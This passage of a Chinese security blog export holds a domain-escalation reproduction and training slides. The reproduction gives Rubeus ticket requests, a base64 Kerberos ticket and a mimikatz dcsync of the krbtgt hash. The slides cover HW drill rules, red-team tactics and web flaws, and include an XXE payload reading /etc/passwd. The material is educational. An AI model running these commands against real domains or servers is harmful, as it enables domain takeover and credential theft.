id=\"4、Reset-the-computer-name（利用Powermad重设机器名称）\"><a href=\"#4、Reset-the-computer-name（利用Powermad重设机器名称）\" class=\"headerlink\" title=\"4、Reset the computer name（利用Powermad重设机器名称）\"></a>4、Reset the computer name（利用Powermad重设机器名称）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;dc&quot;</span> -Attribute samaccountname -Verbose</span><br><span class=\"line\">//由于当前DC SPN账户为dc$，故要设置为dc进行伪造</span><br></pre></td></tr></table></figure>\n<p><img src=\"564a7c07-f22d-498a-b59a-c9836ba03760.png\" alt=\"image\"></p>\n<h3 id=\"5、Request-TGT-（请求TGT）\"><a href=\"#5、Request-TGT-（请求TGT）\" class=\"headerlink\" title=\"5、Request TGT （请求TGT）\"></a>5、Request TGT （请求TGT）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\Rubeus.exe asktgt /user:dc /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br><span class=\"line\">.\\Rubeus.exe asktgt /user:administrator /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br></pre></td></tr></table></figure>\n<p><img src=\"d4f1a458-e3d8-478c-9d83-46fc845961a9.png\" alt=\"image\"></p>\n<h3 id=\"6、Change-Machine-Account-samaccountname（还原初始账户属性）\"><a href=\"#6、Change-Machine-Account-samaccountname（还原初始账户属性）\" class=\"headerlink\" title=\"6、Change Machine Account samaccountname（还原初始账户属性）\"></a>6、Change Machine Account samaccountname（还原初始账户属性）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//重新还原机器帐户属性后，现在就可以使用能检索到的TGT请求S4U2self票证来获得使用DC密钥加密的ST，同时还可以将票证中的sname重写为LDAP服务</span><br><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;testspn&quot;</span> -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"6e958824-068b-45b5-9985-6c3fcd6b299b.png\" alt=\"image\"></p>\n<h3 id=\"7、Request-S4U2self（获取票据）\"><a href=\"#7、Request-S4U2self（获取票据）\" class=\"headerlink\" title=\"7、Request S4U2self（获取票据）\"></a>7、Request S4U2self（获取票据）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:dc.fbi.gov /self /altservice:LDAP/dc.fbi.gov /ptt /ticket:doIEeDCCBHSgAwIBBaEDAgEWooIDojCCA55hggOaMIIDlqADAgEFoQkbB0ZCSS5HT1aiHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3ajggNkMIIDYKADAgESoQMCAQKiggNSBIIDTrthGAetrVBk/8RvLbf8KpocXuH9ewn4Cr3y1yM/SGY9QvfoS5TKeRBCraXNHZZxnAumMZ3zM8smSeA35epcmXPJaVSPTKYCQoI5f5dwXQUAgFEtzeqreVLkUJKg2rXB0mi4pzSEbOa+y8t3EJLVE+p42gzKG6FaI31OnBEqKOUfM0U8LECZVDsZlD9GMn/Atf/jYQovWtcW+NWFJDh/dw6pxCRDUDmCmpCH538Tz9QTB2S8PhHnZqjrzLtnIeXE7eRAg49ruoHKAV6rdrfl5HD2rziAadBKDQ1H2eLne8AtuBo+I1GGlnZoIEty7TnITtXDlPll+O5Qes+e3gkI1omlhJAKTw2rOgQzlQwavp8FCu/Z4LMZ6M85/sD4lg5azJqp/w9VwnPZ1jCYx/CU0/vfQDci5ePx4h2yYo2o6ID21q8Wrg53rfMXvl+MYrrhH5lHxo4Uv5J6wkURiZZLx8rokSU2gCBuFaYe6iOyHUQIpC1XGlSwy9V/5MHbukibBH+ixhnP/ATprJiPSj6CaPpGgdllbWl0YyexFTg96CaLIRV1uBAlm266RDxxUHEBOsWZZIsDnw0B4dUTlhgKB4j5MY9y/aEoWb8mdvpsVDgA1GN5uZyfXyctvNSKfkyMNB2kZySj6esAW6L5n2pcAMnAIqZEQfP2zO5t8eRQOP4Yl7CdMRDPA5bbjdZp6wYLKgBYzKdxQyAbjkbQIWVVB15zQkc1Yc9POZPVlfxPF9JwJKq21jPf7QvXs3n1ebaQbputQIMpsEnywcEAzgW7Oy4uejdn3zi4fET57RXXBFOaqxLKf4KDPyqip5GDGtVJqGDK/vUO5zSin7v5mEWF7kinucZlgTSg5iMzgSdGC//joD9xElA65f/iQCIeOOUl+iDFs/tf8EQZvEQKbp88LI6KcDqYvJ3Ge1rvFIQwhGxsLWsAAutkFMn111nyKBTmqi/+OllYPbZhkHRglUBB80SXK85BUhL3a3O3JR3tHlHTz+A0DOUloiYDVn4qhx76rPFSkhdnH9ZdxX9I/PAkJDYnGubfoMo+/5OhcQG1WWQP8XkjwllcOKTmf1HTOLXUtXFkpos8F/84+Z+g9mKzk3QlcCzRfLQ8j+ntOeGGWqOBwTCBvqADAgEAooG2BIGzfYGwMIGtoIGqMIGnMIGkoBswGaADAgEXoRIEEIZs7uBBRhm/zUWKNCQGYYChCRsHRkJJLkdPVqIPMA2gAwIBAaEGMAQbAmRjowcDBQBA4QAApREYDzIwMjIwNDA2MTU0MzQwWqYRGA8yMDIyMDQwNzAxNDM0MFqnERgPMjAyMjA0MTMxNTQzNDBaqAkbB0ZCSS5HT1apHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3Y==</span><br></pre></td></tr></table></figure>\n<p><img src=\"76ffa80f-2b6c-4df9-a93d-ad5c0be5edd1.png\" alt=\"image\"></p>\n<p><img src=\"da74ce78-3d65-405f-aa5b-34202c5125f6.png\" alt=\"image\"></p>\n<h3 id=\"8、获取-kbrtgt-用户的-NTLM-Hash\"><a href=\"#8、获取-kbrtgt-用户的-NTLM-Hash\" class=\"headerlink\" title=\"8、获取 kbrtgt 用户的 NTLM Hash\"></a>8、获取 kbrtgt 用户的 NTLM Hash</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe</span><br><span class=\"line\">lsadump::dcsync /domain:fbi.gov /user:krbtgt</span><br><span class=\"line\">//一句话输出</span><br><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;lsadump::dcsync /domain:fbi.gov /user:krbtgt&quot;</span> <span class=\"built_in\">exit</span> &gt;dcsync.txt</span><br></pre></td></tr></table></figure>\n","categories":["漏洞复现"],"tags":["漏洞复现","域控","权限提升"]},{"title":"day1-HW基本规则介绍（下午）","url":"/2022/08/16/day1-HW%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%89/","content":"<h1 id=\"day1-HW基本规则介绍（下午）\"><a href=\"#day1-HW基本规则介绍（下午）\" class=\"headerlink\" title=\"day1-HW基本规则介绍（下午）\"></a>day1-HW基本规则介绍（下午）</h1><p>问？：请问哪位同学知道第一次hw是什么时候开始的</p>\n<h2 id=\"一、HW起源\"><a href=\"#一、HW起源\" class=\"headerlink\" title=\"一、HW起源\"></a>一、HW起源</h2><p>2016年，公安部会同民航局、国家电网组织开展了 “护网2016”网络安全攻防演习活动。</p>\n<p>同年，《网络安全法》颁布，出台网络安全演练相关规定：关键信息基础设施的运营者应“制定网络安全事件应急预案，并定期进行演练”。</p>\n<p>自此“护网行动”进入人们视野，成为网络安全建设重要的一环。</p>\n<p><img src=\"B47xQ1y2J8248lKif3QZTOdEQuv77SIDOeBkJ1iJ2B0.png\" alt=\"image\"></p>\n<h2 id=\"二、发展和基本规则介绍\"><a href=\"#二、发展和基本规则介绍\" class=\"headerlink\" title=\"二、发展和基本规则介绍\"></a>二、发展和基本规则介绍</h2><h3 id=\"发展\"><a href=\"#发展\" class=\"headerlink\" title=\"发展\"></a>发展</h3><p>2016年：公安部会同民航局、国家电网</p>\n<p>2017年：旅游局、北京食药监局、北京自来水集团、央视网、中国人寿、小米科技等</p>\n<p>2018年：税务、电力、电信、银行、铁路、财务、广电、水利、教育、互联网、检察等</p>\n<p>2019年：行业更广、范围更大、运营商行业</p>\n<h3 id=\"基本规则\"><a href=\"#基本规则\" class=\"headerlink\" title=\"基本规则\"></a>基本规则</h3><p>攻击靶心由各单位自报或公安部指定，公安部一般提前3周通知各单位参演靶心，以及攻击的起始时间与结束时间，各单位可在此期间进行防御准备。</p>\n<p>评分原则：</p>\n<p>1、根据安全防护能力强弱对防守方进行排名</p>\n<p>2、初始分5000分</p>\n<p>3、目标系统被拿下不参加排名，则护网失败 </p>\n<p>4、攻击方提交 报告1小时内，防守方发现来自攻击方的行为上报不扣分</p>\n<p>5、主要考核参演单位监测发现能力、应急处置能力与公安机关配合能力</p>\n<p>防守方减分规则：</p>\n<p>•获取权限：</p>\n<p>•10分一台终端权限（不超过200分）</p>\n<p>•20分一个webshell权限（不超过300分，特重要加20分）</p>\n<p>•20分一个普通40分一个管理员系统邮箱VPN等（不超过800，特重要加60分 ）</p>\n<p>•60分普通100分管理服务器（不超过1200分，特重要加100分）</p>\n<p>•300分管理员域控服务器权限（不超过3000分、特重要加300分）</p>\n<p>•50分接入层，100分汇聚层路由交换防火墙（不超过1000分，特重要加100-200分）</p>\n<p>•其他设备由裁判组核定</p>\n<p>防守方加分规则：</p>\n<p>•发现攻击：</p>\n<p>•50分一个木马攻击（不超过500分，提交截图证据）</p>\n<p>•20分一个钓鱼邮件（不超过200分，提交分析报告和wml格式文件）</p>\n<p>•50分一个漏洞攻击（不超过500分，提交分析报告和攻击负载附件）</p>\n<p>•消除威胁：</p>\n<p>•50分一个webshell木马（不超过500分，提交木马样本分析报告控制流量证据等）</p>\n<p>•20分一个系统服务新增账号（不超过200分，提交源ip、日志、流量证据等）</p>\n<p>•50分一个主机新增账号（不超过500分，提交源ip、日志、流量证据等）</p>\n<p>•配合应急处理：</p>\n<p>•高效+300一般+200差-100应急处理（最高300分，最低-100分）</p>\n<h2 id=\"三、红队常见攻击思路\"><a href=\"#三、红队常见攻击思路\" class=\"headerlink\" title=\"三、红队常见攻击思路\"></a>三、红队常见攻击思路</h2><p>攻防第一定律：只要是代码，都有漏洞</p>\n<p>攻防第二定律：资产越重，机会越多</p>\n<p>1、侦查追踪：攻击者搜寻目标弱点，具体手段如收集钓鱼攻击用的登录凭证和信息</p>\n<p>2、武器构建：使用漏洞和后门制定一个可发送的武器载体</p>\n<p>3、载荷投递：将网络武器包向目标投送，如发送一封带有恶意链接的欺诈邮件</p>\n<p>4、漏洞利用：在受害的系统上运行利用代码</p>\n<p>5、安装注入：在目标位置安装恶意软件</p>\n<p>6、命令控制：为攻击者建立可远程控制目标系统的路径</p>\n<p>7、目标达成：攻击者远程完成其预期目标</p>\n<h2 id=\"四、案例、技战法分享\"><a href=\"#四、案例、技战法分享\" class=\"headerlink\" title=\"四、案例、技战法分享\"></a>四、案例、技战法分享</h2><p>防守方不仅要适应红队攻击视角，还要熟悉攻击的手法和“套路”，这样才能“以子之矛攻子之盾”。</p>\n<h3 id=\"攻击技战法一：全面信息收集\"><a href=\"#攻击技战法一：全面信息收集\" class=\"headerlink\" title=\"攻击技战法一：全面信息收集\"></a>攻击技战法一：全面信息收集</h3><p>信息收集是攻击第一步也是最重要的一步，安全圈有句专业术语叫“攻击的本质在于信息收集”，足以看出信息收集的分量了。红队在发起攻击前，会尽可能多的搜集攻击目标信息，做到知己知彼，直击目标最脆弱的地方。</p>\n<p>攻击者搜集的信息包括：目标组织的人员信息、邮箱，VPN，组织架构、网络资产、技术框架及安全措施信息。分支机构、关联公司、外包公司、投资公司等等。</p>\n<p>一方面，攻击者会在公开渠道收集信息，如：搜索引擎、GitHub、社交网络、ICP、备案库、BGP归属、社工库、Fofa 、shodan、官方网站、主域名、子域名，旁站；利用证书透明原则、目标组织的TLS&#x2F;SSL证书等手段监控新部署资产信息从而进行打新。</p>\n<p>另一方面，攻击者也会利用自动化工具或平台进行目标资产梳理，精准识别资产指纹，记录攻击目标资产的详细类型，以便对应到可进行利用的漏洞。</p>\n<p>此外，利用社会工程学类进行信息收集的行为也不可小觑，包括：邮件钓鱼、伪装接近关键人物、伪装潜入核心办公区、记录工牌样式、大楼门卫换班情况等。</p>\n<h3 id=\"攻击技战法二：云端陷落\"><a href=\"#攻击技战法二：云端陷落\" class=\"headerlink\" title=\"攻击技战法二：云端陷落\"></a>攻击技战法二：云端陷落</h3><p>随着云的流行和天然优势，越来越多的企业开始部署和使用混合云，但是也产生了相应的安全问题，攻击者也开辟了新的攻击路径。</p>\n<p>例如，越来越多的企业将系统部署到私有云中对外提供服务，如：web服务、OA、邮箱等。攻击者通过私有云的0day进行虚拟机逃逸，拿下私有云的云管平台，以云管平台为跳板，直接攻击内网系统。</p>\n<h3 id=\"攻击技战法三：不以小而不为\"><a href=\"#攻击技战法三：不以小而不为\" class=\"headerlink\" title=\"攻击技战法三：不以小而不为\"></a>攻击技战法三：不以小而不为</h3><h2 id><a href=\"#\" class=\"headerlink\" title></a></h2><p>1.经过了两天的正面猛烈攻击后，未能撕开口子，小看了供应链或下属单位的资产</p>\n<p>2.收集和摸清使用的供应链产品或者供应链企业，在这些供应链或者企业上寻找漏洞，得到新的攻击路径或者切入点，就能够从源头上上摧毁信任</p>\n<p>3.收集和排查目标系统中使用的供应链，用了哪些第三方产品或哪些厂家提供的产品或者服务，收集对应的漏洞，或者找到源码进行审计，储备0day。</p>\n<p>4.收集提供开发或者服务的供应链企业或者下属单位，下属监管单位等，可能存在直通内网或者专网互联的情况。</p>\n<p>5.利用挖掘的漏洞进行攻击供应链或下属单位，获取到一定的权限后，从内部网络横向到核心靶标</p>\n<p>6.从侧通道进行了隐蔽的攻击</p>\n<h3 id=\"攻击技战法四：蜜罐诱捕\"><a href=\"#攻击技战法四：蜜罐诱捕\" class=\"headerlink\" title=\"攻击技战法四：蜜罐诱捕\"></a>攻击技战法四：蜜罐诱捕</h3><p>1.安全设备发现redteam已经撕开了口子，正在提权</p>\n<p>2.迅速制作类似旁侧资产的蜜罐进行诱捕</p>\n<p>3.在蜜罐的服务器中，放入一些引诱redteam下载点击的文件，如vpn账号密码以及客户端，运维监控系统账号密码.word</p>\n<p>4.redteam上线，进行人物社交的信息收集</p>\n<p>5.浏览器网址信息，计算机名称，微信文件等</p>\n<p>6.结合社工库进行定位到真人</p>\n","categories":["原创培训课件"],"tags":["HW","技战法"]},{"title":"day1-网络安全概念（上午）","url":"/2022/08/16/day1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%89/","content":"<h1 id=\"day1-网络安全概念（上午）\"><a href=\"#day1-网络安全概念（上午）\" class=\"headerlink\" title=\"day1-网络安全概念（上午）\"></a>day1-网络安全概念（上午）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>受邀需要做一场为期<strong>七天</strong>的网络安全现场培训，经过自己的梳理，根据整个课程大纲来制作这一次培训的课件。旨在提高人员的安全水平，对网络安全能够有进一步的认知。（该系列（自制课件）的课件内容均为个人原创）</p>\n<h2 id=\"网络安全政策法规简介\"><a href=\"#网络安全政策法规简介\" class=\"headerlink\" title=\"网络安全政策法规简介\"></a>网络安全政策法规简介</h2><p>      随着全球网络空间威胁态势变得更加复杂和严峻，网络安全已稳步上升到全球各国政府的议程，成为数字时代全球政府治理的核心议题之一。</p>\n<p>     习主席曾说：  没有网络安全就没有国家安全。今年是《中华人民共和国网络安全法》施行五周年。一直以来，习主席高度重视网络安全和信息化工作，敏锐把握信息时代“时”与“势”，多次在不同场合就网络安全发表一系列重要论述，为维护国家网络安全，筑牢国家网络安全屏障奠定基石。</p>\n<p>简单列举一下一些 国内施行的政策：</p>\n<p>     2016年11月7日，第十二届全国人民代表大会常务委员会第二十四次会议通过《中华人民共和国网络安全法》，自2017年6月1日起施行。《中华人民共和国网络安全法》是为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定的法规。</p>\n<p><img src=\"_3CDkaUfeSLQYY0eJW01rr5s9SPtDnjSgAsl_u6VGaQ.png\" alt=\"image\"></p>\n<p>2021年施行《数据安全法》、《个人信息保护法》等几部重磅法律落地实施。</p>\n<p><img src=\"9YAvL7VMsfBgVQ21DshRF1yhrom3HOWRVe3Tl5r9reY.png\" alt=\"image\"></p>\n<p>国家网络安全宣传周，以“共建网络安全，共享网络文明”为主题。围绕金融、电信、电子政务、电子商务等重点领域和行业网络安全问题，针对社会公众关注的热点问题，举办网络安全体验展等系列主题宣传活动，营造网络安全人人有责、人人参与的良好氛围。</p>\n<p> 每年9月第三周，第一届 2014年</p>\n<p><img src=\"iPzdR8Aejuv7HcarZHjljz58EZGfwOkPxCPCUOGJfNk.png\" alt=\"image\"></p>\n<h2 id=\"网络安全概念\"><a href=\"#网络安全概念\" class=\"headerlink\" title=\"网络安全概念\"></a>网络安全概念</h2><p>      随着计算机技术的飞速发展，信息网络已经成为社会发展的重要保证。有很多是敏感信息，甚至是国家机密。所以难免会吸引来自世界各地的各种人为攻击（例如信息泄露、信息窃取、数据篡改、数据删添、计算机病毒等）。同时，网络实体还要经受诸如水灾、火灾、地震、电磁辐射等方面的考验。</p>\n<p><img src=\"7hD_BfL2-ujYs18FGz7D4mb4svl7Nm9dTpMSwTCq-jM.png\" alt=\"image\"></p>\n<p>     网络安全（Cyber Security）是指网络系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的原因而遭受到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。</p>\n<p>网络安全，通常指计算机网络的安全，实际上也可以指计算机通信网络的安全。计算机通信网络是将若干台具有独立功能的计算机通过通信设备及传输媒体互连起来，在通信软件的支持下，实现计算机间的信息传输与交换的系统。而计算机网络是指以共享资源为目的，利用通信手段把地域上相对分散的若干独立的计算机系统、终端设备和数据设备连接起来，并在协议的控制下进行数据交换的系统。</p>\n<p>计算机网络的根本目的在于资源共享，通信网络是实现网络资源共享的途径，因此，计算机网络是安全的，相应的计算机通信网络也必须是安全的，应该能为网络用户实现信息交换与资源共享。下文中，网络安全既指计算机网络安全，又指计算机通信网络安全。</p>\n<p>安全的基本含义：客观上不存在威胁，主观上不存在恐惧。即客体不担心其正常状态受到影响。可以把网络安全定义为：一个网络系统不受任何威胁与侵害，能正常地实现资源共享功能。要使网络能正常地实现资源共享功能，首先要保证网络的硬件、软件能正常运行，然后要保证数据信息交换的安全。从前面两节可以看到，由于资源共享的滥用，导致了网络的安全问题。因此网络安全的技术途径就是要实行有限制的共享。</p>\n<p>问：？</p>\n<p>张三网上自学了一些黑客技术，在夜深人静的时候，对某单位进行攻击。是否属于违法犯罪。</p>\n<h2 id=\"渗透测试概念\"><a href=\"#渗透测试概念\" class=\"headerlink\" title=\"渗透测试概念\"></a>渗透测试概念</h2><h3 id=\"什么是渗透测试？\"><a href=\"#什么是渗透测试？\" class=\"headerlink\" title=\"什么是渗透测试？\"></a>什么是渗透测试？</h3><p>      渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。</p>\n<p>       换句话来说，渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。</p>\n<p><img src=\"6SlhztgIL2FbyoLC_RuU2Q2lMtaJMVMn1CVZyumVPUY.png\" alt=\"image\"></p>\n<h3 id=\"为什么要进行渗透测试？\"><a href=\"#为什么要进行渗透测试？\" class=\"headerlink\" title=\"为什么要进行渗透测试？\"></a>为什么要进行渗透测试？</h3><p>1.技术性验证&#x2F;检查安全隐患</p>\n<p>有效的主动性防御手段，技术性验证目标系统的安全性，查找系统的安全隐患。</p>\n<p>2.合规、评估的基本要求</p>\n<p>渗透测试是安全规范和法律的基本要求，如等级保护、风险评估、PCI认证中均要求进行渗透性测试。</p>\n<p>3.单位形象&#x2F;经济规避</p>\n<p>渗透测试可帮助企业因安全问题带来的单位形象的损失和经济损失的风险，提高客户的操作安全性或满足业务合作伙伴的要求。最终的目标应该是最大限度地减小业务风险。</p>\n<p>4.安全教育与技能提升</p>\n<p>渗透测试的结果可作为内部安全意识的案例，在对相关的接口人员进行安全教育时使用。一份专业的渗透测试报告不但可为用户提供作为案例，更可作为常见安全原理的学习参考。</p>\n","categories":["原创培训课件"],"tags":["某培训","网络安全"]},{"title":"day2-web安全基础二（下午：逻辑漏洞、未授权、信息泄露）","url":"/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%89/","content":"<h1 id=\"day2-web安全基础二（下午：逻辑漏洞、未授权、信息泄露）\"><a href=\"#day2-web安全基础二（下午：逻辑漏洞、未授权、信息泄露）\" class=\"headerlink\" title=\"day2-web安全基础二（下午：逻辑漏洞、未授权、信息泄露）\"></a>day2-web安全基础二（下午：逻辑漏洞、未授权、信息泄露）</h1><h2 id=\"逻辑类\"><a href=\"#逻辑类\" class=\"headerlink\" title=\"逻辑类\"></a>逻辑类</h2><p>原理</p>\n<p>由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>\n<p>平行越权: A用户和B用户属于同一级别用户,但各自不能操作对方个人信息, A用户如果越权操作B用户的个人信息的情况称为平行越权操作<br>垂直越权。A用户权限高于B用户 , B用户越权操作A用户的权限的情况称为垂直越权。</p>\n<p>挖掘方法</p>\n<p>关注类似于userid这些字段</p>\n<p><a href=\"http://192.168.88.104:8088/vul/overpermission/op1/op1_login.php\">http://192.168.88.104:8088/vul/overpermission/op1/op1_login.php</a></p>\n<p>常用利用方法</p>\n<p>1.越权到其它用户，拥有其它用户的权限，窃取其它用户的敏感信息。</p>\n<p>2.越权的管理员用户，拥有管理员的权限。</p>\n<p>修复方法</p>\n<p>1、对用户访问角色的权限进行严格的检查及限制。</p>\n<p>2、在一些操作时可以使用session对用户的身份进行判断和控制</p>\n<h2 id=\"未授权访问\"><a href=\"#未授权访问\" class=\"headerlink\" title=\"未授权访问\"></a>未授权访问</h2><p>原理</p>\n<p>由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p>\n<p>挖掘方法</p>\n<p>Active MQ 未授权访问</p>\n<p>Atlassian Crowd 未授权访问</p>\n<p>CouchDB 未授权访问</p>\n<p>Docker 未授权访问</p>\n<p>Dubbo 未授权访问</p>\n<p>Druid 未授权访问</p>\n<p>Elasticsearch 未授权访问</p>\n<p>FTP 未授权访问</p>\n<p>Hadoop 未授权访问</p>\n<p>JBoss 未授权访问</p>\n<p>Jenkins 未授权访问</p>\n<p>Jupyter Notebook 未授权访问</p>\n<p>Kibana 未授权访问</p>\n<p>Kubernetes Api Server 未授权访问</p>\n<p>LDAP 未授权访问</p>\n<p>MongoDB 未授权访问</p>\n<p>Memcached 未授权访问</p>\n<p>NFS 未授权访问</p>\n<p>Rsync 未授权访问</p>\n<p>Redis 未授权访问</p>\n<p>RabbitMQ 未授权访问</p>\n<p>Solr 未授权访问</p>\n<p>Spring Boot Actuator 未授权访问</p>\n<p>Spark 未授权访问</p>\n<p>VNC 未授权访问</p>\n<p>Weblogic 未授权访问</p>\n<p>ZooKeeper 未授权访问</p>\n<p>Zabbix 未授权访问</p>\n<p>常用利用方法</p>\n<p>tomcat未授权，后台部署war包getshell</p>\n<p>修复方法</p>\n<p>　   1、页面进行严格的访问权限的控制以及对访问角色进行权限检查。</p>\n<p>　　2、可以使用session对用户的身份进行判断和控制。</p>\n<h2 id=\"信息泄露\"><a href=\"#信息泄露\" class=\"headerlink\" title=\"信息泄露\"></a>信息泄露</h2><p>原理</p>\n<p>在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>\n<p>挖掘方法</p>\n<p><a href=\"http://192.168.88.104:8088/vul/infoleak/findabc.php\">http://192.168.88.104:8088/vul/infoleak/findabc.php</a></p>\n<p>常用利用方法</p>\n<p>修复方法</p>\n<p>1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>\n<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>\n<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>\n<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>\n","categories":["原创培训课件"],"tags":["未授权","逻辑漏洞"]},{"title":"day3-web安全基础三（上午：XXE、文件上传、文件包含）","url":"/2022/08/16/day3-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9AXXE%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/","content":"<h1 id=\"day3-web安全基础三（上午：XXE、文件上传、文件包含）\"><a href=\"#day3-web安全基础三（上午：XXE、文件上传、文件包含）\" class=\"headerlink\" title=\"day3-web安全基础三（上午：XXE、文件上传、文件包含）\"></a>day3-web安全基础三（上午：XXE、文件上传、文件包含）</h1><h2 id=\"XML注入\"><a href=\"#XML注入\" class=\"headerlink\" title=\"XML注入\"></a>XML注入</h2><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>XXE -“xml external entity injection”，既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”，也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>\n<p>实际上是因为后端在接收xml数据时，开启了外部实体解析，而且也没对传来的数据做任何的过滤等安全措施，因此导致产生漏洞。</p>\n<h3 id=\"挖掘方法\"><a href=\"#挖掘方法\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#直接在 XML 文档中声明并引用</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> ?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">&lt;!ELEMENT <span class=\"title function_\">note</span> <span class=\"params\">(to,from,heading,body)</span>&gt;</span><br><span class=\"line\"> &lt;!ELEMENT <span class=\"title function_\">to</span> <span class=\"params\">(#PCDATA)</span>&gt;</span><br><span class=\"line\"> &lt;!ELEMENT <span class=\"title function_\">from</span> <span class=\"params\">(#PCDATA)</span>&gt;</span><br><span class=\"line\"> &lt;!ELEMENT <span class=\"title function_\">heading</span> <span class=\"params\">(#PCDATA)</span>&gt;</span><br><span class=\"line\"> &lt;!ELEMENT <span class=\"title function_\">body</span> <span class=\"params\">(#PCDATA)</span>&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;note&gt;</span><br><span class=\"line\">&lt;to&gt;xxe&lt;/to&gt; </span><br><span class=\"line\">&lt;from&gt;garck&lt;/from&gt; </span><br><span class=\"line\">&lt;heading&gt;Hello&lt;/heading&gt; </span><br><span class=\"line\">&lt;body&gt;Are you OK!&lt;/body&gt; </span><br><span class=\"line\">&lt;/note&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">PCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA 是会被解析器解析的文</span><br><span class=\"line\">本。这些文本将被解析器检进行检查。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">内部申明DTD格式</span><br><span class=\"line\">&lt;!DOCTYPE 根元素 [元素申明]&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">外部引用DTD格式</span><br><span class=\"line\">&lt;!DOCTYPE 根元素 SYSTEM <span class=\"string\">&quot;外部DTD的URI&quot;</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">引用公共DTD格式</span><br><span class=\"line\">&lt;!DOCTYPE 根元素 PUBLIC <span class=\"string\">&quot;DTD标识名&quot;</span> <span class=\"string\">&quot;公共DTD的URI&quot;</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">外部实体引用 Payload</span><br><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE ANY[&lt;!ENTITY f SYSTEM <span class=\"string\">&quot;file:///etc/passwd&quot;</span>&gt;]&gt;</span><br><span class=\"line\">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">外部引用可以支持http，file，ftp等协议。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE ANY[&lt;!ENTITY garck SYSTEM <span 